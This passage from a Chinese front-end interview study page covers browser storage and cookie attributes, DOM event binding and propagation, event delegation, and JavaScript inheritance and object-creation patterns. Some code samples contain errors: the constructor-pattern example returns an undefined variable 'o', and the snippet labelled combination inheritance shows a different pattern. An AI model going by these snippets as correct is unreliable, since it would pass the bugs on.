style="text-align:center;">长期存储（如用户偏好设置）</td></tr> <tr><td style="text-align:center;">删除单个数据</td> <td style="text-align:center;">设置过期时间为过去或 Max-Age=0</td> <td style="text-align:center;">removeItem(key)</td> <td style="text-align:center;">removeItem(key)</td></tr> <tr><td style="text-align:center;">清空所有数据</td> <td style="text-align:center;">遍历所有Cookie逐个删除</td> <td style="text-align:center;">clear()</td> <td style="text-align:center;">clear()</td></tr> <tr><td style="text-align:center;">自动失效机制</td> <td style="text-align:center;">依赖 Expires/Max-Age 设置</td> <td style="text-align:center;">标签页关闭自动清除</td> <td style="text-align:center;">无，需手动或程序控制</td></tr> <tr><td style="text-align:center;">安全注意事项</td> <td style="text-align:center;">敏感数据应标记 HttpOnly 和 Secure（防止 XSS 和嗅探）</td> <td style="text-align:center;">不要存储敏感信息（如密码），易受 XSS 攻击</td> <td style="text-align:center;">不要存储敏感信息（如密码），易受 XSS 攻击</td></tr></tbody></table> <h3 id="cookie字段详解"><a href="#cookie字段详解" class="header-anchor">#</a> cookie字段详解</h3> <h4 id="_1-domain-可选"><a href="#_1-domain-可选" class="header-anchor">#</a> 1. Domain（可选）</h4> <p>作用​​：指定哪些域名可以接收该 Cookie</p> <ul><li>规则​​：
<ul><li>默认值为当前域名（不包括子域名）</li> <li>若指定 .example.com 则包含所有子域名</li></ul></li></ul> <div class="language-http line-numbers-mode"><pre class="language-http"><code><span class="token header"><span class="token header-name keyword">Set-Cookie</span><span class="token punctuation">:</span> <span class="token header-value">user=john; Domain=.example.com</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h4 id="_2-path-可选"><a href="#_2-path-可选" class="header-anchor">#</a> 2. Path（可选）</h4> <p>​作用​​：指定 URL 路径前缀，只有匹配的路径才会发送 Cookie<br>
默认值​​：/（整个站点)</p> <div class="language-http line-numbers-mode"><pre class="language-http"><code><span class="token header"><span class="token header-name keyword">Set-Cookie</span><span class="token punctuation">:</span> <span class="token header-value">cart=items; Path=/shop</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h4 id="_3-secure-可选"><a href="#_3-secure-可选" class="header-anchor">#</a> 3. Secure（可选）</h4> <ul><li>​作用​​：仅通过 HTTPS 协议传输</li> <li>安全要求​​：
<ul><li>敏感 Cookie（如会话ID）必须设置</li> <li>防止中间人攻击</li></ul></li></ul> <div class="language-http line-numbers-mode"><pre class="language-http"><code><span class="token header"><span class="token header-name keyword">Set-Cookie</span><span class="token punctuation">:</span> <span class="token header-value">auth=t0k3n; Secure</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h4 id="_4-httponly-可选"><a href="#_4-httponly-可选" class="header-anchor">#</a> 4. HttpOnly（可选）</h4> <ul><li>​作用​​：阻止 JavaScript 通过 document.cookie 访问</li> <li>​安全要求​​：
<ul><li>防止 XSS 攻击窃取 Cookie</li> <li>会话 Cookie 应该始终启用</li></ul></li></ul> <div class="language-http line-numbers-mode"><pre class="language-http"><code><span class="token header"><span class="token header-name keyword">Set-Cookie</span><span class="token punctuation">:</span> <span class="token header-value">session=xyz; HttpOnly</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h4 id="_5-samesite-可选-重要安全字段"><a href="#_5-samesite-可选-重要安全字段" class="header-anchor">#</a> 5. SameSite（可选，重要安全字段）</h4> <ul><li>作用​​：控制跨站请求是否发送 Cookie</li> <li>取值​​：
<ul><li>Strict：完全禁止跨站发送</li> <li>Lax：允许安全跨站请求（GET，导航操作）</li> <li>None：允许所有跨站请求（必须配合 Secure）
现代浏览器默认​​：Lax</li></ul></li></ul> <div class="language-http line-numbers-mode"><pre class="language-http"><code><span class="token header"><span class="token header-name keyword">Set-Cookie</span><span class="token punctuation">:</span> <span class="token header-value">csrf=token123; SameSite=Strict</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h4 id="_6-expires-可选"><a href="#_6-expires-可选" class="header-anchor">#</a> 6. Expires（可选）</h4> <ul><li>​作用​​：设置绝对过期时间（GMT 格式）</li> <li>​与 Max-Age 关系​​：
<ul><li>两者同时存在时 Max-Age 优先级更高</li> <li>都不设置则为会话 Cookie（浏览器关闭即失效）</li></ul></li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code>Set<span class="token operator">-</span>Cookie<span class="token operator">:</span> pref<span class="token operator">=</span>dark<span class="token punctuation">;</span> Expires<span class="token operator">=</span>Wed<span class="token punctuation">,</span> <span class="token number">21</span> Oct <span class="token number">2025</span> <span class="token number">07</span><span class="token operator">:</span><span class="token number">28</span><span class="token operator">:</span><span class="token number">00</span> <span class="token constant">GMT</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h4 id="_7-max-age-可选"><a href="#_7-max-age-可选" class="header-anchor">#</a> 7. Max-Age（可选）</h4> <p>作用​​：设置相对过期时间（秒）</p> <div class="language-http line-numbers-mode"><pre class="language-http"><code><span class="token header"><span class="token header-name keyword">Set-Cookie</span><span class="token punctuation">:</span> <span class="token header-value">tracking=1; Max-Age=86400 // 1天</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h3 id="sessionstorage-localstorage​​"><a href="#sessionstorage-localstorage​​" class="header-anchor">#</a> sessionStorage/localStorage​​：</h3> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// 使用 Web Storage API（简单易用）</span>
localStorage<span class="token punctuation">.</span><span class="token function">setItem</span><span class="token punctuation">(</span><span class="token string">'theme'</span><span class="token punctuation">,</span> <span class="token string">'dark'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
sessionStorage<span class="token punctuation">.</span><span class="token function">setItem</span><span class="token punctuation">(</span><span class="token string">'tempData'</span><span class="token punctuation">,</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">id</span><span class="token operator">:</span> <span class="token number">1</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><h2 id="_22-事件绑定-3-种方法"><a href="#_22-事件绑定-3-种方法" class="header-anchor">#</a> 22. 事件绑定 3 种方法</h2> <p><strong>1、HTML 事件处理(在 dom 元素中嵌入)</strong></p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span><span class="token value javascript language-javascript"><span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span><span class="token punctuation">&quot;</span></span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><div class="custom-block warning"><p class="custom-block-title">WARNING</p> <ul><li>缺点：<br>
1、this 指向 window<br>
2、HTML 与 JS 紧密耦合，改动代码麻烦</li></ul></div> <p><strong>2、DOM0 级事件处理(获取 dom 元素直接绑定)</strong></p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">&quot;btn&quot;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>onclick <span class="token operator">=</span> fn<span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><div class="custom-block warning"><p class="custom-block-title">WARNING</p> <ul><li>优点：<br>
1、this 指向 dom 元素<br>
2、不存在浏览器兼容问题</li></ul></div> <p><strong>3、DOM2 级事件处理(事件监听)</strong></p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">&quot;btn&quot;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">&quot;click&quot;</span><span class="token punctuation">,</span> fn<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><div class="custom-block warning"><p class="custom-block-title">WARNING</p> <ul><li>优点：<br>
1、this 指向 dom 元素</li> <li>缺点：<br>
1、需要对 IE8 及以下进行兼容</li></ul></div> <div class="custom-block tip"><p class="custom-block-title">TIP</p> <p>tip: document.getElementById('btn').attachEvent('click',fn)<br>
由于 IE8 及以下只支持事件冒泡，所以通过 attachEvent 都会被添加到冒泡阶段<br>
IE 中的 attachEvent 中的 this 总是指向全局对象 Window</p></div> <h2 id="_23-事件冒泡、捕获和阻止"><a href="#_23-事件冒泡、捕获和阻止" class="header-anchor">#</a> 23. 事件冒泡、捕获和阻止</h2> <h4 id="事件冒泡-即事件开始时由最具体的元素-文档中嵌套层数最深的那个点-接收-然后逐级向上传播到较为不具体的节点-文档"><a href="#事件冒泡-即事件开始时由最具体的元素-文档中嵌套层数最深的那个点-接收-然后逐级向上传播到较为不具体的节点-文档" class="header-anchor">#</a> 事件冒泡：即事件开始时由最具体的元素(文档中嵌套层数最深的那个点)接收，然后逐级向上传播到较为不具体的节点(文档)</h4> <blockquote><p>由 div -&gt; body -&gt; html -&gt; document</p></blockquote> <h4 id="事件捕获-不太具体的节点应该更早接收到事件-而最具体的节点应该最后接收到事件"><a href="#事件捕获-不太具体的节点应该更早接收到事件-而最具体的节点应该最后接收到事件" class="header-anchor">#</a> 事件捕获：不太具体的节点应该更早接收到事件，而最具体的节点应该最后接收到事件</h4> <blockquote><p>由 document -&gt; html -&gt; body -&gt; div</p></blockquote> <p>因为老版本的不支持，因此很少会用事件捕获,多数在事件冒泡下处理程序</p> <p><strong>DOM2 级规定的事件流包括三个阶段：事件捕获阶段、处于目标阶段、事件冒泡阶段</strong></p> <h4 id="阻止事件冒泡-event-stoppropagation"><a href="#阻止事件冒泡-event-stoppropagation" class="header-anchor">#</a> 阻止事件冒泡：event.stopPropagation()</h4> <p>一个阻止事件冒泡的办法就是使用 event.stopPropagation()<br>
在 IE&lt;9 的浏览器上使用 event.cancelBubble = true</p> <h4 id="取消事件的默认行为-preventdefault"><a href="#取消事件的默认行为-preventdefault" class="header-anchor">#</a> 取消事件的默认行为：preventDefault()</h4> <p>1、在其他浏览器中调用方法 e.preventDefault()<br>
2、在 IE 浏览器中通过 e.returnValue = false</p> <h4 id="当-return-false-的时候"><a href="#当-return-false-的时候" class="header-anchor">#</a> 当 return false“的时候</h4> <p>在 DOM0 级事件中，可以像 event.preventDefault() 取消默认事件，但是在 DOM2 级则不行</p> <h4 id="stopimmediatepropagation"><a href="#stopimmediatepropagation" class="header-anchor">#</a> stopImmediatePropagation()</h4> <p>这个方法会停止一个事件继续执行，即使当前的对象上还绑定了其它处理函数<br>
所有绑定在一个对象上的事件会按绑定顺序执行</p> <h2 id="_24-事件委托"><a href="#_24-事件委托" class="header-anchor">#</a> 24. 事件委托</h2> <p>也叫事件代理</p> <ul><li>好处：
节省内存：每个函数都是一个对象，是对象就会占用内存，对象越多，内存占用率就越大<br>
不需要为每个子节点注销事件<br>
不知道子节点的具体数量时(下拉加载图片)</li> <li>原理：<br>
事件委托是利用事件的冒泡原理来实现的<br>
通过 e.target 获取具体子元素</li></ul> <h2 id="_25-dom-事件中-currenttarget-和-target-的区别"><a href="#_25-dom-事件中-currenttarget-和-target-的区别" class="header-anchor">#</a> 25. dom 事件中 currentTarget 和 target 的区别</h2> <ul><li>本质区别是：<br>
event.target 返回触发事件的元素<br>
event.currentTarget 返回绑定事件的元素</li></ul> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span><span class="token value css language-css"><span class="token property">width</span><span class="token punctuation">:</span> 30px<span class="token punctuation">;</span><span class="token property">height</span><span class="token punctuation">:</span> 30px<span class="token punctuation">;</span><span class="token property">background-color</span><span class="token punctuation">:</span> #0e91e1</span><span class="token punctuation">&quot;</span></span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
    document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">&quot;body&quot;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function-variable function">onclick</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">&quot;currentTarget:&quot;</span><span class="token punctuation">,</span> e<span class="token punctuation">.</span>currentTarget<span class="token punctuation">)</span><span class="token punctuation">;</span>
      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">&quot;target:&quot;</span><span class="token punctuation">,</span> e<span class="token punctuation">.</span>target<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">;</span>
  </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span>

点击div时: currentTarget: body target: div 点击body时: currentTarget: body
target: body
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br></div></div><h2 id="_26-js-继承方式总结"><a href="#_26-js-继承方式总结" class="header-anchor">#</a> 26. jS 继承方式总结</h2> <p><a href="http://cavszhouyou.top/JavaScript%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E4%B9%8B%E7%BB%A7%E6%89%BF.html" target="_blank" rel="noopener noreferrer">参考<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <p>一共6种，构造函数、原型链继承、组合继承、寄生式继承、寄生式组合继承、ES6继承</p> <h4 id="借用构造函数继承"><a href="#借用构造函数继承" class="header-anchor">#</a> 借用构造函数继承</h4> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">Parent</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
<span class="token keyword">function</span> <span class="token function">Children</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token function">Parent</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 或apply</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>缺点：父类原型上的东西是没法继承的，因此函数复用也就无从谈起</p> <h4 id="原型链继承"><a href="#原型链继承" class="header-anchor">#</a> 原型链继承</h4> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">Parent</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
<span class="token keyword">function</span> <span class="token function">Children</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
<span class="token class-name">Children</span><span class="token punctuation">.</span>prototype <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Parent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>这种方式确实解决了上面借用构造函数继承方式的缺点<br>
但是，这种方式仍有缺点:实例化了两个 Child 原型链上中的原型对象它俩是共用的</p> <h4 id="组合继承"><a href="#组合继承" class="header-anchor">#</a> 组合继承</h4> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">Parent</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
<span class="token keyword">function</span> <span class="token function">Children</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
<span class="token class-name">Children</span><span class="token punctuation">.</span>prototype <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token class-name">Parent</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">Children</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>constructor <span class="token operator">=</span> Children<span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><h4 id="寄生式继承"><a href="#寄生式继承" class="header-anchor">#</a> 寄生式继承</h4> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">createAnother</span><span class="token punctuation">(</span><span class="token parameter">original</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">var</span> clone <span class="token operator">=</span> <span class="token function">object</span><span class="token punctuation">(</span>original<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//通过调用函数创建一个新对象</span>
    clone<span class="token punctuation">.</span><span class="token function-variable function">sayHi</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token comment">// 某种方式增强这个对象</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">&quot;hi&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> clone<span class="token punctuation">;</span>  <span class="token comment">// 返回这个对象</span>
<span class="token punctuation">}</span>

<span class="token keyword">var</span> person <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">&quot;james&quot;</span><span class="token punctuation">}</span>
<span class="token keyword">var</span> anotherPerson <span class="token operator">=</span> <span class="token function">createAnother</span><span class="token punctuation">(</span>person<span class="token punctuation">)</span><span class="token punctuation">;</span>

anotherPerson<span class="token punctuation">.</span><span class="token function">sayHi</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// &quot;hi&quot;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br></div></div><p>优点：在主要考虑对象而不是自定义类型和构造函数的情况下，实现简单的继承。<br>
缺点：使用该继承方式，在为对象添加函数的时候，没有办法做到函数的复用。</p> <h4 id="es6-继承"><a href="#es6-继承" class="header-anchor">#</a> ES6 继承</h4> <p>Class 可以通过 extends 关键字实现继承</p> <h2 id="_27-js创建对象的几种方式"><a href="#_27-js创建对象的几种方式" class="header-anchor">#</a> 27. JS创建对象的几种方式</h2> <p><a href="http://cavszhouyou.top/JavaScript%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E4%B9%8B%E5%AF%B9%E8%B1%A1%E5%88%9B%E5%BB%BA.html" target="_blank" rel="noopener noreferrer">参考<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a><br>
一共7种，包含工厂模式、构造函数模式、原型模式、组合使用构造函数模式和原型模式、动态原型模式、寄生构造函数模式、稳妥构造函数模式</p> <h4 id="工厂模式"><a href="#工厂模式" class="header-anchor">#</a> 工厂模式</h4> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">createPerson</span><span class="token punctuation">(</span><span class="token parameter">name</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">var</span> o <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    o<span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>
    o<span class="token punctuation">.</span><span class="token function-variable function">sayName</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token function">alert</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> o<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">var</span> person1 <span class="token operator">=</span> <span class="token function">createPerson</span><span class="token punctuation">(</span><span class="token string">&quot;james&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> person2 <span class="token operator">=</span> <span class="token function">createPerson</span><span class="token punctuation">(</span><span class="token string">&quot;kobe&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><p>优点：解决了创建多个相似对象时，代码的复用问题<br>
缺点：使用工厂模式创建的对象，没有解决对象识别的问题（就是怎样知道一个对象的类型是什么）</p> <h4 id="构造函数模式"><a href="#构造函数模式" class="header-anchor">#</a> 构造函数模式</h4> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">createPerson</span><span class="token punctuation">(</span><span class="token parameter">name</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function-variable function">sayName</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token function">alert</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> o<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">var</span> person1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">createPerson</span><span class="token punctuation">(</span><span class="token string">&quot;james&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> person2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">createPerson</span><span class="token punctuation">(</span><span class="token string">&quot;kobe&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><p>优点：解决了工厂模式中对象类型无法识别的问题，并且创建自定义的构造函数意味着将来可以将它的实例标识为一种特定的类型。<br>
缺点：我们知道 ECMAScript 中的函数是对象，在使用构造函数创建对象时，每个方法都会在实例对象中重新创建一遍。拿上面的例子举例，这意味着每创建一个对象，我们就会创建一个 sayName 函数的实例，但它们其实做的都是同样的工作，因此这样便会造成内存的浪费。</p> <h4 id="原型模式"><a href="#原型模式" class="header-anchor">#</a> 原型模式</h4> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span>

<span class="token class-name">Person</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">&quot;james&quot;</span><span class="token punctuation">;</span>
<span class="token class-name">Person</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">sayName</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token function">alert</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">var</span> person1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
person1<span class="token punctuation">.</span><span class="token function">sayName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// &quot;james&quot;</span>

<span class="token keyword">var</span> person2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
person2<span class="token punctuation">.</span><span class="token function">sayName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// &quot;james&quot;</span>

console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>person1<span class="token punctuation">.</span>sayName <span class="token operator">===</span> person2<span class="token punctuation">.</span>sayName<span class="token punctuation">)</span> <span class="token comment">// true</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br></div></div><p>优点：解决了构造函数模式中多次创建相同函数对象的问题，所有的实例可以共享同一组属性和函数。
